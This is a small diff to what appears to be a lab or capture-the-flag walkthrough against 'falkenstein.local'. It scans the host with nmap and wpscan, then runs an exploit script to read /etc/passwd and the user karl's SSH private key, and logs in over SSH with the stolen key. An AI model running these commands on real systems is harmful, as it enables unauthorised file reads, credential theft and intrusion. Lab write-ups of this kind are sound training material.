@@ -10,6 +10,7 @@ sudo nmap -A --top-ports 50 falkenstein.local -oX - | xsltproc -o 0_overview.htm
 ```bash
 wpscan --url "http://falkenstein.local" --no-update --disable-tls-checks --plugins-detection aggressive --enumerate ap,cb
 ```
+
 ap = all plugins
 cb = configuration backups
 ## Initial Access
@@ -30,11 +31,11 @@ python 50420.py http://falkenstein.local /etc/passwd
 ```
 We find username karl
 ```bash
-python 50420.py http://falkenstein.local /home/karl/.ssh/id_ed25519
+python 50420.py http://falkenstein.local /home/karl/.ssh/id_rsa
 ```
 
 ```bash
-ssh -i id_ed25519 karl@falkenstein.local
+ssh -i id_rsa karl@falkenstein.local
 ```
 
 ```bash
